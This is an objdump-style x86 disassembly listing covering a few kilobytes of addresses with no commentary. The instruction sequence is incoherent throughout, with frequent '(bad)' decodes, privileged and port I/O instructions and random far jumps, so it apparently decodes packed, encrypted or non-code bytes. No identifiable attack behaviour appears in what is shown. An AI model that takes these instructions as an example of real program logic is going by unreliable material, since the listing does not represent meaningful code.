  40902b:	mov    eax,ds:0x71ff2011
  409030:	mov    ah,0x8
  409032:	mov    eax,0xdce5f8d4
  409037:	cli    
  409038:	pop    ebx
  409039:	push   ebp
  40903a:	loop   0x408fe7
  40903c:	or     al,0x7e
  40903e:	sub    BYTE PTR [ecx+0x5d],bh
  409041:	leave  
  409042:	mov    gs,edi
  409044:	test   bh,al
  409046:	(bad)  
  409047:	(bad)  
  409048:	mov    ebx,0x870905d9
  40904d:	fsub   DWORD PTR [eax+0x692c175b]
  409053:	or     BYTE PTR [ebx+0x39],ch
  409056:	arpl   sp,ax
  409058:	(bad)  
  409059:	rol    dl,1
  40905b:	repnz and DWORD PTR [edx-0x7c],ebx
  40905f:	mov    ds:0x80b45fde,eax
  409064:	pusha  
  409065:	inc    esi
  409066:	repz push ebx
  409068:	pop    edx
  409069:	mov    al,0x40
  40906b:	fcomp  QWORD PTR [ecx-0x10d711cd]
  409071:	adc    eax,0x30f90c92
  409076:	sub    ecx,DWORD PTR [esi]
  409078:	cmp    eax,0xe87bf943
  40907d:	adc    edx,DWORD PTR [ebx-0x12d8449d]
  409083:	outs   dx,BYTE PTR ds:[esi]
  409084:	arpl   WORD PTR [ebx-0x70],bp
  409087:	loop   0x40906f
  409089:	ror    ebp,cl
  40908b:	in     al,dx
  40908c:	and    esp,DWORD PTR [edi-0x4f12f286]
  409092:	dec    edi
  409093:	mov    DWORD PTR [ecx],ecx
  409095:	loop   0x4090ca
  409097:	push   es
  409098:	mov    BYTE PTR [ebx+0x75abf226],ah
  40909e:	sub    al,0xce
  4090a0:	cmc    
  4090a1:	inc    ebx
  4090a2:	int3   
  4090a3:	je     0x409038
  4090a5:	in     al,0xb9
  4090a7:	cs push ebx
  4090a9:	add    BYTE PTR [eax+0x26e00560],ch
  4090af:	aaa    
  4090b0:	scas   al,BYTE PTR es:[edi]
  4090b1:	and    al,0xd8
  4090b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4090b4:	push   esp
  4090b5:	and    dl,BYTE PTR ds:0x65c58f56
  4090bb:	fadd   QWORD PTR [eax-0x5a]
  4090be:	mov    WORD PTR [edi],?
  4090c0:	repz and bh,dl
  4090c3:	icebp  
  4090c4:	jle    0x409114
  4090c6:	mov    dl,0x8d
  4090c8:	add    eax,0xfd40d9b1
  4090cd:	fisubr DWORD PTR [ebx]
  4090cf:	mov    bl,0x57
  4090d1:	mov    DWORD PTR ss:[ebp+0x782e7fb],ebx
  4090d8:	ss dec edi
  4090da:	and    BYTE PTR [esi+0x13ce566c],dh
  4090e0:	jmp    0xc7b162f2
  4090e5:	lds    edx,FWORD PTR [bx]
  4090e8:	xor    ecx,ecx
  4090ea:	add    bl,BYTE PTR [eax+0x35]
  4090ed:	cmp    edx,edx
  4090ef:	cmp    eax,0x6c4fb0c8
  4090f4:	sbb    ecx,ebx
  4090f6:	mov    cl,0xa5
  4090f8:	and    dh,BYTE PTR ss:[eax+edx*4-0x65]
  4090fd:	aas    
  4090fe:	inc    ebp
  4090ff:	out    dx,eax
  409100:	test   DWORD PTR [di],ebp
  409103:	push   0x2d
  409105:	ja     0x4090e7
  409107:	adc    dh,al
  409109:	ds pop ecx
  40910b:	ret    
  40910c:	stos   BYTE PTR es:[edi],al
  40910d:	inc    ecx
  40910e:	loope  0x40917a
  409110:	xchg   edx,eax
  409111:	cmp    DWORD PTR [edx-0x5a],ebp
  409114:	mov    WORD PTR [edi],cs
  409116:	jecxz  0x409190
  409118:	mov    edx,0x53a7c2e4
  40911d:	pop    ecx
  40911e:	les    ebx,FWORD PTR [esp+ecx*2-0xd617eee]
  409125:	sbb    eax,0xbcaebf54
  40912a:	in     al,0xcf
  40912c:	jl     0x409107
  40912e:	rol    DWORD PTR [edx+ebx*1],1
  409131:	ins    BYTE PTR es:[edi],dx
  409132:	in     al,0x75
  409134:	xor    dl,dl
  409136:	pop    edi
  409137:	hlt    
  409138:	ss jge 0x4090fd
  40913b:	pop    eax
  40913c:	push   0xffffff9a
  40913e:	jmp    0x1f5ff4f5
  409143:	jae    0x40918e
  409145:	jno    0x4091bd
  409147:	sbb    al,0x5f
  409149:	lock pop ds
  40914b:	loope  0x40918a
  40914d:	stos   DWORD PTR es:[edi],eax
  40914e:	pop    ss
  40914f:	int    0x5f
  409151:	sbb    al,0x3e
  409153:	jg     0x409193
  409155:	(bad)  
  409156:	pop    edx
  409157:	gs arpl ax,si
  40915a:	pop    es
  40915b:	call   FWORD PTR [ecx+0x2315592d]
  409161:	push   ebx
  409162:	adc    eax,0x28209474
  409167:	je     0x409182
  409169:	out    0x77,eax
  40916b:	mov    ch,0xea
  40916d:	or     al,0xf1
  40916f:	retf   
  409170:	nop
  409171:	retf   0x5043
  409174:	xor    ah,BYTE PTR [esi+0x25ffaeae]
  40917a:	test   al,0x9a
  40917c:	or     cl,BYTE PTR [edx-0x2d]
  40917f:	(bad)  
  409180:	psadbw mm2,QWORD PTR [eiz*2+0x722ab671]
  409188:	mov    esp,DWORD PTR [esi+0x31]
  40918b:	nop
  40918c:	jg     0x40918e
  40918e:	test   al,0xe8
  409190:	lahf   
  409191:	into   
  409192:	in     al,dx
  409193:	nop
  409194:	push   es
  409195:	push   es
  409196:	out    dx,al
  409197:	std    
  409198:	imul   ecx,DWORD PTR [ebx],0xffffffec
  40919b:	add    ecx,ecx
  40919d:	add    BYTE PTR [edi+0x477014fc],0x72
  4091a4:	push   ss
  4091a5:	xchg   esi,eax
  4091a6:	push   ebp
  4091a7:	mov    ds:0xd14d1294,eax
  4091ac:	push   0x660420f1
  4091b1:	in     al,0x3b
  4091b3:	loopne 0x409212
  4091b5:	pop    ebp
  4091b6:	test   DWORD PTR [edx],edi
  4091b8:	jb     0x4091b7
  4091ba:	aad    0xa3
  4091bc:	enter  0x660,0x94
  4091c0:	mov    dh,0x73
  4091c2:	mov    al,0x4
  4091c4:	sub    BYTE PTR [ebx-0xa],bh
  4091c7:	or     edi,DWORD PTR [esi+0x6f1dbdc8]
  4091cd:	jecxz  0x4091ca
  4091cf:	xchg   esp,edx
  4091d1:	cld    
  4091d2:	pop    esp
  4091d3:	jmp    0xf0ab:0x21ff4471
  4091da:	jb     0x40922e
  4091dc:	sub    eax,0x3c5ddab3
  4091e1:	mov    ds:0x7ada5335,eax
  4091e6:	jb     0x4091b6
  4091e8:	ins    BYTE PTR es:[edi],dx
  4091e9:	add    al,0xad
  4091eb:	fsub   QWORD PTR [esi*2+0x1b4be874]
  4091f2:	or     DWORD PTR [edx+esi*1+0x75f0f746],ebx
  4091f9:	add    al,0xaf
  4091fb:	add    eax,DWORD PTR [ecx+0x617c6c06]
  409201:	jmp    0xe71a:0xd20ac750
  409208:	xlat   BYTE PTR ds:[ebx]
  409209:	loopne 0x409275
  40920b:	dec    esp
  40920c:	repz imul esi,DWORD PTR [edi+0x546f9d32],0xc9c178fe
  409217:	retf   
  409218:	dec    esi
  409219:	std    
  40921a:	sbb    DWORD PTR [edx+0x4d],edi
  40921d:	jbe    0x409217
  40921f:	test   bl,al
  409221:	jne    0x40929b
  409223:	jl     0x4091be
  409225:	pop    esi
  409226:	popa   
  409227:	push   es
  409228:	fild   DWORD PTR [eax+0x72d3a10d]
  40922e:	sbb    edx,edi
  409230:	jmp    0xf186676
  409235:	out    dx,al
  409236:	cmp    edi,DWORD PTR [edx]
  409238:	cmp    DWORD PTR [esi-0x1f553327],edi
  40923e:	jecxz  0x409273
  409240:	scas   eax,DWORD PTR es:[edi]
  409241:	mov    BYTE PTR [esi],dh
  409243:	xor    DWORD PTR [edx+0x7f2288bc],ecx
  409249:	rcl    BYTE PTR [eax],cl
  40924b:	jp     0x409253
  40924d:	xor    edx,DWORD PTR [esi+esi*4+0x1f]
  409251:	imul   esi,ebx,0xb16f2e57
  409257:	and    al,0x6d
  409259:	ins    DWORD PTR es:[edi],dx
  40925a:	outs   dx,BYTE PTR ds:[esi]
  40925b:	jnp    0x409208
  40925d:	jnp    0x4092d7
  40925f:	xor    eax,0xe3ca1757
  409264:	(bad)  
  409265:	rcl    ecx,1
  409267:	cmc    
  409268:	cld    
  409269:	xchg   edi,eax
  40926a:	fnsave [edi]
  40926c:	stc    
  40926d:	jb     0x4092a2
  40926f:	jle    0x4092c3
  409271:	adc    DWORD PTR [eax+0x73fe0c51],edi
  409277:	inc    edi
  409278:	mov    eax,ecx
  40927a:	mov    ebx,ebx
  40927c:	in     al,0x11
  40927e:	arpl   WORD PTR [esi],bp
  409280:	stos   BYTE PTR es:[edi],al
  409281:	pusha  
  409282:	stc    
  409283:	push   cs
  409284:	pop    ebp
  409285:	es dec eax
  409287:	sbb    edi,DWORD PTR ds:0x2a59bf51
  40928d:	mov    ebx,0xeeb8d645
  409292:	add    DWORD PTR gs:[ebx-0x1185b2bf],ebx
  409299:	pop    esp
  40929a:	ss push ebp
  40929c:	mov    bl,0x3b
  40929e:	sub    ebx,DWORD PTR [ecx+0x4540df8d]
  4092a4:	ins    DWORD PTR es:[edi],dx
  4092a5:	xchg   bx,ax
  4092a7:	and    al,0x7a
  4092a9:	das    
  4092aa:	(bad)  [eax-0x1b3f3198]
  4092b0:	or     DWORD PTR [ecx+0x11],esp
  4092b3:	lds    eax,FWORD PTR [ebp+0x72]
  4092b6:	pop    ecx
  4092b7:	stos   DWORD PTR es:[edi],eax
  4092b8:	dec    ebp
  4092b9:	fisttp WORD PTR [ecx+esi*2-0x30905d1d]
  4092c0:	test   BYTE PTR [esi],bl
  4092c2:	out    0x28,eax
  4092c4:	pushf  
  4092c5:	hlt    
  4092c6:	imul   edx,DWORD PTR [esi+eiz*8-0x36209aae],0xffffffe0
  4092ce:	popa   
  4092cf:	mov    WORD PTR [ebx-0x62361884],ds
  4092d5:	(bad)  
  4092d6:	inc    BYTE PTR [edx+0x53765d30]
  4092dc:	retf   0x814
  4092df:	add    eax,0x2ba1aef
  4092e4:	gs cmc 
  4092e6:	pusha  
  4092e7:	push   edi
  4092e8:	adc    esp,DWORD PTR [ebx+edi*2+0x164d35ac]
  4092ef:	(bad)  
  4092f0:	fs int3 
  4092f2:	cmp    esp,DWORD PTR [ecx-0x49]
  4092f5:	ins    DWORD PTR es:[edi],dx
  4092f6:	call   0x412a:0x717a36fd
  4092fd:	pop    ebp
  4092fe:	jbe    0x4092bd
  409300:	jg     0x4092f2
  409302:	retf   
  409303:	popf   
  409304:	loop   0x409292
  409306:	sub    DWORD PTR [edx+edi*2-0x580e4f0b],0xa867177c
  409311:	sub    eax,0x4f48d7d4
  409316:	dec    esp
  409317:	out    0xd6,al
  409319:	mov    dl,0x36
  40931b:	bound  ebx,QWORD PTR [eax]
  40931d:	repz daa 
  40931f:	cli    
  409320:	inc    ebx
  409321:	js     0x40938c
  409323:	pop    edi
  409324:	sbb    al,0x9b
  409326:	dec    ebx
  409327:	imul   edi,DWORD PTR [edx],0xffffffde
  40932a:	ret    0xec86
  40932d:	nop
  40932e:	ins    DWORD PTR es:[edi],dx
  40932f:	adc    ah,cl
  409331:	lods   eax,DWORD PTR ds:[esi]
  409332:	sti    
  409333:	loop   0x40939a
  409335:	test   al,0xa0
  409337:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  409339:	and    cl,bl
  40933b:	in     eax,dx
  40933c:	and    BYTE PTR [edx],bl
  40933e:	ss pusha 
  409340:	leave  
  409341:	iret   
  409342:	test   BYTE PTR [eax-0x1f69793c],dl
  409348:	stc    
  409349:	pop    es
  40934a:	adc    DWORD PTR ds:0xf6f19511,edx
  409350:	repz push ecx
  409352:	or     BYTE PTR [edi+0x28],dl
  409355:	aaa    
  409356:	jge    0x409390
  409358:	(bad)  
  40935a:	cld    
  40935b:	daa    
  40935c:	test   al,0x69
  40935e:	inc    eax
  40935f:	les    esi,FWORD PTR [edx-0x562602f3]
  409365:	js     0x4092f7
  409367:	mov    DWORD PTR [esi-0x6dca1498],edx
  40936d:	cli    
  40936e:	(bad)  
  40936f:	hlt    
  409370:	adc    cl,ah
  409372:	sbb    al,0x62
  409374:	stos   DWORD PTR es:[edi],eax
  409375:	xchg   esi,eax
  409376:	mov    ebp,0x2e0cdfe6
  40937b:	inc    edi
  40937c:	or     DWORD PTR [esi+edi*8],0x15
  409380:	pop    edx
  409381:	and    bh,BYTE PTR [eax]
  409383:	sbb    eax,0xb9fe8f99
  409388:	mov    ebx,0xb6bda7eb
  40938d:	lea    ebx,[esi]
  40938f:	aam    0x34
  409391:	sub    eax,0xe00106d5
  409396:	jmp    0x4093c3
  409398:	jl     0x40938e
  40939a:	dec    edx
  40939b:	mov    edx,0x1d3da570
  4093a0:	xor    eax,eax
  4093a2:	sub    DWORD PTR [edi],edx
  4093a4:	add    BYTE PTR [esi],0xbd
  4093a7:	lahf   
  4093a8:	and    esp,DWORD PTR ds:0x4e9b2f8a
  4093ae:	rcr    DWORD PTR [ecx-0x4e],cl
  4093b1:	jge    0x4093da
  4093b3:	test   al,0x6b
  4093b5:	test   DWORD PTR [ecx+0x1ed53bf6],esp
  4093bb:	jns    0x4093d1
  4093bd:	prefetchwt1 BYTE PTR [eax-0x18]
  4093c1:	mov    cl,BYTE PTR [ecx-0xf]
  4093c4:	pop    ss
  4093c5:	xor    eax,esi
  4093c7:	cld    
  4093c8:	aaa    
  4093c9:	into   
  4093ca:	mov    bh,0x26
  4093cc:	pop    es
  4093cd:	cwde   
  4093ce:	mov    al,ds:0xf31a857
  4093d3:	leave  
  4093d4:	mov    ch,0xb5
  4093d6:	push   0x3f
  4093d8:	and    eax,0x1e8d213
  4093dd:	les    ebp,FWORD PTR [edx]
  4093df:	pop    es
  4093e0:	dec    ecx
  4093e1:	(bad)
  4093e4:	psadbw mm6,QWORD PTR [ecx]
  4093e7:	mov    edx,0xe4737d96
  4093ec:	in     eax,dx
  4093ed:	sar    BYTE PTR [edi],1
  4093ef:	xchg   ebx,eax
  4093f0:	add    DWORD PTR [ecx],ecx
  4093f2:	cli    
  4093f3:	sub    esi,DWORD PTR [ebx+0x32703bee]
  4093f9:	xlat   BYTE PTR ds:[ebx]
  4093fa:	mov    bh,0x6b
  4093fc:	jmp    0x76baaa1c
  409401:	out    dx,eax
  409402:	retf   0xf4b6
  409405:	xchg   DWORD PTR [ebx],esi
  409407:	dec    edi
  409408:	add    ecx,DWORD PTR ds:0x4526ad99
  40940e:	imul   eax,DWORD PTR [edx+0x1fc596e],0x53
  409415:	test   al,0x5e
  409417:	scas   eax,DWORD PTR es:[edi]
  409418:	cmp    cl,BYTE PTR [esi-0x20]
  40941b:	inc    eax
  40941c:	pop    edi
  40941d:	xchg   edx,eax
  40941e:	aaa    
  40941f:	mov    ch,0xbb
  409421:	outs   dx,DWORD PTR ds:[esi]
  409422:	jne    0x4093b8
  409424:	xor    al,0xb1
  409426:	pop    esi
  409427:	mov    ah,0xb2
  409429:	xor    dl,BYTE PTR [esp+esi*2-0xd]
  40942d:	mov    ah,0xf6
  40942f:	sahf   
  409430:	pop    esi
  409431:	cmp    eax,0x354f2b94
  409436:	es jle 0x4093f6
  409439:	jnp    0x40941e
  40943b:	mov    cl,0x87
  40943d:	inc    ecx
  40943e:	inc    edx
  40943f:	cmp    ah,bh
  409441:	test   al,0x52
  409443:	jnp    0x4094af
  409445:	and    DWORD PTR [eax],edx
  409447:	dec    esi
  409448:	cmp    al,BYTE PTR [edi+edx*2]
  40944b:	cmp    ch,0xb5
  40944e:	fst    QWORD PTR [ebp+0x49f1b062]
  409454:	test   al,0xb5
  409456:	shl    DWORD PTR [esi-0x26459ada],cl
  40945c:	(bad)  
  40945d:	sbb    ch,al
  40945f:	and    eax,0xe9a00148
  409464:	push   esp
  409465:	mov    edx,eax
  409467:	inc    esp
  409468:	popa   
  409469:	sub    al,0xa3
  40946b:	fnstcw WORD PTR [edx]
  40946d:	lds    esi,FWORD PTR [ebx]
  40946f:	mov    ?,WORD PTR ds:0xfda6c3b
  409475:	jmp    0x409449
  409477:	imul   ebx,edx,0xffffff88
  40947a:	mov    esp,0x9fd9ceb5
  40947f:	jg     0x409409
  409481:	mov    al,0xa8
  409483:	push   edi
  409484:	push   0x7c
  409486:	inc    ecx
  409487:	les    edx,FWORD PTR [esi+0x7c]
  40948a:	sbb    ah,BYTE PTR [edx]
  40948c:	imul   edx,DWORD PTR [edi-0xa],0x8ffa4d75
  409493:	sub    ebp,DWORD PTR [ebp-0x2178cd3]
  409499:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40949a:	lea    ebp,ds:0x66f04720
  4094a0:	mov    DWORD PTR [esp+ecx*4-0x3f],esp
  4094a4:	sti    
  4094a5:	clc    
  4094a6:	xor    BYTE PTR [ecx-0x77],bh
  4094a9:	lea    edi,[edi]
  4094ab:	(bad)  
  4094ac:	add    al,0x90
  4094ae:	mov    bh,0xc5
  4094b0:	lods   eax,DWORD PTR ds:[esi]
  4094b1:	dec    esi
  4094b2:	adc    bl,bh
  4094b4:	aad    0x5c
  4094b6:	ss ror bl,1
  4094b9:	push   0xffffffb6
  4094bb:	call   0x24933655
  4094c0:	inc    eax
  4094c1:	mov    esi,cs
  4094c3:	cld    
  4094c4:	fbld   TBYTE PTR [ebp+0x608dd80f]
  4094ca:	ja     0x4094aa
  4094cc:	push   edx
  4094cd:	addr16 daa 
  4094cf:	out    dx,eax
  4094d0:	add    edi,DWORD PTR [eax-0x5d09eb6b]
  4094d6:	mov    dl,0x36
  4094d8:	mov    edx,0x499cb05e
  4094dd:	fwait
  4094de:	cmp    DWORD PTR ds:0xff38bc23,ebx
  4094e4:	pop    ebx
  4094e5:	std    
  4094e6:	cmp    eax,0x403a8512
  4094eb:	mov    bl,0x22
  4094ed:	sti    
  4094ee:	fdivr  QWORD PTR [eax-0x51]
  4094f1:	cmp    DWORD PTR [bx+0x4b9],0xb0c9f505
  4094fa:	add    al,0xc
  4094fc:	jnp    0x409570
  4094fe:	cmp    dl,cl
  409500:	jb     0x409538
  409502:	sub    cl,al
  409504:	dec    edx
  409505:	add    DWORD PTR [ebp+esi*1-0x4b],edi
  409509:	cld    
  40950a:	in     eax,0x85
  40950c:	(bad)  
  40950e:	outs   dx,DWORD PTR ds:[esi]
  40950f:	adc    al,0x6f
  409511:	add    eax,0xba3c6c1a
  409516:	fidivr WORD PTR [esi+0xba52587]
  40951c:	xor    bl,BYTE PTR [edx+0x7a]
  40951f:	out    0x3a,al
  409521:	and    BYTE PTR [edi+edx*4-0x43],cl
  409525:	icebp  
  409526:	imul   esp,eax,0x76
  409529:	and    DWORD PTR [ebx-0x28aa0882],esi
  40952f:	jle    0x409519
  409531:	cs imul edi,eax,0x85ff97f8
  409538:	loope  0x40959c
  40953a:	mov    dl,0xb2
  40953c:	mov    edi,0xbd08477a
  409541:	fnstcw WORD PTR [edi]
  409543:	mov    eax,0x90625a2d
  409548:	cwde   
  409549:	call   0xe8fb77be
  40954e:	stc    
  40954f:	inc    esi
  409550:	rcr    edi,cl
  409552:	pop    esi
  409553:	mov    al,ds:0x6d68ebd6
  409558:	lock hlt 
  40955a:	dec    ebp
  40955b:	xor    al,BYTE PTR ds:0xa25837b5
  409561:	repnz add edx,DWORD PTR [eax-0x69]
  409565:	mov    al,0xe0
  409567:	rcr    esi,0xd1
  40956a:	xchg   edx,eax
  40956b:	fnstsw WORD PTR [esi-0x262a7418]
  409571:	mov    esi,0x85fc226e
  409576:	xchg   ebx,eax
  409577:	mov    ch,BYTE PTR [esi+0x741b82b2]
  40957d:	imul   edi,DWORD PTR [edi],0x9db17df2
  409583:	cmp    BYTE PTR [ecx*4-0x1e02a75c],ch
  40958a:	push   ebx
  40958b:	jge    0x4095ad
  40958d:	ret    0xc673
  409590:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409591:	xchg   edi,eax
  409592:	adc    ch,BYTE PTR [edx]
  409594:	dec    edi
  409595:	sbb    eax,0xf8003ff
  40959a:	imul   DWORD PTR [eax]
  40959c:	lods   al,BYTE PTR ds:[esi]
  40959d:	adc    BYTE PTR [ebx],al
  40959f:	sub    edi,edx
  4095a1:	adc    ah,BYTE PTR [ecx+0x17]
  4095a4:	jo     0x4095c0
  4095a6:	xchg   esp,eax
  4095a7:	jg     0x40955c
  4095a9:	xor    ch,ch
  4095ab:	dec    ebx
  4095ac:	jp     0x40957d
  4095ae:	mov    ds:0xfa183ee0,al
  4095b3:	sub    eax,0x61ac5638
  4095b8:	jmp    0x1da6cb6
  4095bd:	mov    esp,0xf3ca47fe
  4095c2:	rcr    BYTE PTR [eax-0x7a719bf9],1
  4095c8:	jmp    0x409616
  4095ca:	ror    ch,cl
  4095cc:	jge    0x409601
  4095ce:	sahf   
  4095cf:	js     0x409583
  4095d1:	mov    ecx,DWORD PTR [eax-0x48]
  4095d4:	nop
  4095d5:	sub    BYTE PTR [edi-0x1b],cl
  4095d8:	cs faddp st(2),st
  4095db:	dec    ecx
  4095dc:	push   ecx
  4095dd:	mov    bh,0x1
  4095df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4095e0:	jge    0x40960c
  4095e2:	ins    BYTE PTR es:[edi],dx
  4095e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4095e4:	push   0x30
  4095e6:	fsubp  st(1),st
  4095e8:	les    edx,FWORD PTR [esi+0xf9e3215]
  4095ee:	aaa    
  4095ef:	iret   
  4095f0:	xor    bl,BYTE PTR fs:[edx-0x640931cf]
  4095f7:	xlat   BYTE PTR ds:[ebx]
  4095f8:	(bad)  
  4095fa:	retf   0xbb3c
  4095fd:	cld    
  4095fe:	popf   
  4095ff:	ins    DWORD PTR es:[edi],dx
  409600:	pop    ebp
  409601:	mov    BYTE PTR [edx+0x2134b0c9],0xe
  409608:	frstor [ebx]
  40960a:	xor    al,0x76
  40960c:	push   ebp
  40960d:	dec    ecx
  40960e:	(bad)  
  40960f:	lods   al,BYTE PTR ds:[esi]
  409610:	imul   DWORD PTR ds:0x80f3d5ed
  409616:	mov    ebx,0x1704604e
  40961b:	xor    ebp,DWORD PTR [eax]
  40961d:	enter  0x7435,0x83
  409621:	mov    edi,0x96c4a136
  409626:	xchg   edx,eax
  409627:	xor    DWORD PTR [edi+0xdb59a11],0x5259e2da
  409631:	mov    gs,WORD PTR [edi-0x8]
  409634:	mov    esp,0x8bc13f9
  409639:	mov    ss,WORD PTR [ebp+0x12]
  40963c:	dec    ebx
  40963d:	and    eax,0x98f7aa23
  409642:	fs xor eax,0xe2ba0982
  409648:	ja     0x40961a
  40964a:	mov    ecx,0x27057c81
  40964f:	pop    eax
  409650:	inc    esi
  409651:	fs adc edi,0xab7609a4
  409658:	clc    
  409659:	or     esi,DWORD PTR [ebp+0x67]
  40965c:	scas   al,BYTE PTR es:[edi]
  40965d:	pop    ebp
  40965e:	push   es
  40965f:	outs   dx,DWORD PTR ds:[esi]
  409660:	xchg   ebp,eax
  409661:	cli    
  409662:	js     0x4096e2
  409664:	sub    ebx,eax
  409666:	lods   eax,DWORD PTR ds:[esi]
  409667:	out    0x82,al
  409669:	shl    DWORD PTR [eax+0x5b],1
  40966c:	(bad)  
  40966d:	popf   
  40966e:	adc    eax,0xc7920311
  409673:	outs   dx,DWORD PTR ds:[esi]
  409674:	xchg   edx,eax
  409675:	xchg   BYTE PTR [edi-0x44],dl
  409678:	or     BYTE PTR [edx-0x5],dh
  40967b:	cmp    dh,BYTE PTR [ebp*1+0x10beef35]
  409682:	ds stos DWORD PTR es:[edi],eax
  409684:	dec    ebx
  409685:	scas   al,BYTE PTR es:[edi]
  409686:	xor    bh,BYTE PTR [ebp-0x5d47c311]
  40968c:	popa   
  40968d:	mov    DWORD PTR ds:0x5b9e5a28,ebx
  409693:	xchg   ebx,eax
  409694:	jg     0x409643
  409696:	jns    0x409710
  409698:	inc    ecx
  409699:	daa    
  40969a:	cmc    
  40969b:	frstor [ebp-0x70]
  40969e:	add    al,0xdc
  4096a0:	mov    ss,WORD PTR [edi-0x49]
  4096a3:	pop    eax
  4096a4:	dec    BYTE PTR [eax+0x38]
  4096a7:	ins    BYTE PTR es:[edi],dx
  4096a8:	xchg   DWORD PTR [ecx+esi*2+0x68],ebp
  4096ac:	push   es
  4096ad:	xor    esi,ebx
  4096af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4096b0:	lods   al,BYTE PTR ds:[esi]
  4096b1:	xchg   edx,eax
  4096b2:	or     bh,bh
  4096b4:	mov    ?,WORD PTR [eax+0x4a3788f1]
  4096ba:	in     eax,0xd6
  4096bc:	repnz sbb BYTE PTR [eax-0x73],ah
  4096c0:	dec    edi
  4096c1:	pop    es
  4096c2:	inc    esp
  4096c3:	jno    0x409647
  4096c5:	aad    0x32
  4096c7:	cmp    eax,0x8b51d377
  4096cc:	aas    
  4096cd:	jg     0x40970b
  4096cf:	lods   al,BYTE PTR ds:[esi]
  4096d0:	mov    BYTE PTR [ebx],bl
  4096d2:	mov    ch,0xf
  4096d4:	mov    ebp,0xedc1dc54
  4096d9:	add    BYTE PTR [edi],dl
  4096db:	stos   BYTE PTR es:[edi],al
  4096dc:	jne    0x4096db
  4096de:	sub    al,0xe3
  4096e0:	aam    0x91
  4096e2:	imul   edx,DWORD PTR [ebp-0x94ff40c],0xb226d56f
  4096ec:	or     DWORD PTR [edi-0x407e8bf8],edx
  4096f2:	loopne 0x40971f
  4096f4:	icebp  
  4096f5:	xchg   edx,eax
  4096f6:	int3   
  4096f7:	jne    0x409752
  4096f9:	cwde   
  4096fa:	inc    esi
  4096fb:	lods   al,BYTE PTR ds:[esi]
  4096fc:	std    
  4096fd:	div    DWORD PTR [ebx]
  4096ff:	int    0xc6
  409701:	inc    esi
  409702:	jp     0x409726
  409704:	hlt    
  409705:	scas   eax,DWORD PTR es:[edi]
  409706:	add    al,0x19
  409708:	test   al,0x67
  40970a:	in     eax,dx
  40970b:	sbb    eax,0x65e64eff
  409710:	mov    cl,0xe9
  409712:	jle    0x409738
  409714:	in     al,0x1c
  409716:	dec    ebx
  409717:	jno    0x409707
  409719:	push   edx
  40971a:	ins    DWORD PTR es:[edi],dx
  40971b:	jns    0x40978a
  40971d:	jbe    0x40978a
  40971f:	inc    ecx
  409720:	imul   BYTE PTR [edi-0x6b6b9c61]
  409726:	das    
  409727:	mov    ebp,0x6191dcf5
  40972c:	jnp    0x4096fc
  40972e:	pop    esi
  40972f:	push   ebx
  409730:	mov    fs,WORD PTR [edi-0x32411549]
  409736:	mov    ?,WORD PTR [edx]
  409738:	fistp  DWORD PTR [ecx]
  40973a:	cdq    
  40973b:	or     ebx,ebp
  40973d:	test   ah,bl
  40973f:	enter  0x3085,0x18
  409743:	daa    
  409744:	xor    eax,0x8dfc1539
  409749:	scas   eax,DWORD PTR es:[edi]
  40974a:	xor    BYTE PTR [ebp-0x7664e0ae],dl
  409750:	fnstenv [eax-0x6cb42bd7]
  409756:	xor    DWORD PTR [esi-0x20e5ef13],0xffffff86
  40975d:	cs pop esp
  40975f:	push   ebx
  409760:	add    eax,esp
  409762:	inc    esi
  409763:	mov    esp,0x46e72273
  409768:	cmc    
  409769:	xor    al,0x42
  40976b:	loop   0x40972c
  40976d:	sar    BYTE PTR [ebx+0x5c861505],cl
  409773:	mov    ds:0xecc50f5d,eax
  409778:	mov    esp,0x58a54708
  40977d:	ins    DWORD PTR es:[edi],dx
  40977e:	(bad)  
  40977f:	int3   
  409780:	adc    DWORD PTR [esi],ebp
  409782:	push   DWORD PTR [edi]
  409784:	and    eax,DWORD PTR [ebp+0x3b]
  409787:	mov    bl,0xa1
  409789:	mov    eax,ds:0xcaa77b2c
  40978e:	jmp    0x6e0c0dc2
  409793:	nop
  409794:	test   eax,0x6fd15fd3
  409799:	les    edx,FWORD PTR [ebp+0x5c]
  40979c:	mov    cl,0xa6
  40979e:	mov    cl,BYTE PTR [ebx]
  4097a0:	loopne 0x4097ba
  4097a2:	xchg   esi,eax
  4097a3:	mov    ah,0xc1
  4097a5:	pop    ebp
  4097a6:	pop    edx
  4097a7:	ret    0xf2a8
  4097aa:	test   al,0x16
  4097ac:	mov    ds:0x3d86003a,eax
  4097b1:	inc    edx
  4097b2:	pop    esp
  4097b3:	fsub   QWORD PTR [edx]
  4097b5:	test   eax,0xf62c8367
  4097ba:	push   cs
  4097bb:	cmp    al,bh
  4097bd:	in     eax,0xbd
  4097bf:	mov    gs,WORD PTR [esi+0x35]
  4097c2:	les    eax,FWORD PTR [esp+eax*8+0xb]
  4097c6:	xchg   ecx,eax
  4097c7:	je     0x4097be
  4097c9:	xor    BYTE PTR [esi+eiz*8],0x1
  4097cd:	jo     0x40981b
  4097cf:	sub    BYTE PTR [eax+0x54a89fa3],ch
  4097d5:	or     BYTE PTR [eax-0xfac1a31],ah
  4097db:	shl    DWORD PTR [esi+ecx*1+0x4ce72089],1
  4097e2:	enter  0xb5de,0x81
  4097e6:	dec    edx
  4097e7:	jne    0x4097d6
  4097e9:	and    bl,BYTE PTR [ecx-0x7a]
  4097ec:	ins    BYTE PTR es:[edi],dx
  4097ed:	sbb    bh,BYTE PTR [ebp-0x1f]
  4097f0:	mov    eax,ds:0x3b97f432
  4097f5:	jno    0x4097a6
  4097f7:	push   ds
  4097f8:	sub    ch,BYTE PTR [ebp-0x3871cdfc]
  4097fe:	mov    ebp,0x24adf952
  409803:	call   0x2300c4d8
  409808:	add    dh,ah
  40980a:	jnp    0x4097c8
  40980c:	lods   eax,DWORD PTR ds:[esi]
  40980d:	ds mov edx,0xd2ca5448
  409813:	mov    ebp,0x7940850e
  409818:	mov    al,ds:0xa059622f
  40981d:	sub    bh,BYTE PTR [edi]
  40981f:	xchg   edi,eax
  409820:	icebp  
  409821:	mov    edx,0xaa3a7ae2
  409826:	sahf   
  409827:	xor    BYTE PTR [edi-0x2c21f46],cl
  40982d:	nop
  40982e:	xor    al,0x30
